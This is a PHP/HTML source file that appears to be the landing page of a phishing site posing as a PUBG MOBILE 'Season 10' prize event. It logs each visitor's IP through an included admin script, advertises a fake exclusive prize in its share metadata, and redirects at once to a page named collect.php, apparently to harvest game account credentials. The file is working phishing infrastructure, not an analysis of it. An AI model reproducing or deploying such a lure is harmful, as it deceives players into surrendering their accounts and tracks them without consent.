<?php include ('admin/log-ip.php') ?>
<!DOCTYPE html>
<html>
<head>
<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5dcbabd2869127ad"></script>
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-N3L7KJV');</script>

<meta property="og:title" content="Season 10 - PUBG MOBILE">
<meta property="og:description" content="pubgevent.net Latest PUBG MOBILE update. Get an exclusive Season 10 prize especially for you !!!">
<meta name="google-site-verification" content="zkQm-kl_Xty6hd2a354jMfFH-EMlwYniD-cExk14nO4" />
<meta property="og:image" content="https://www.pubgevent.net/img/thumbnail.jpg">
<meta property="og:url" content="https://www.pubgevent.net">
<meta http-equiv="refresh" content="0;url=collect.php" />

</head>
<body>

<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-N3L7KJV"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>

</body>
</html>
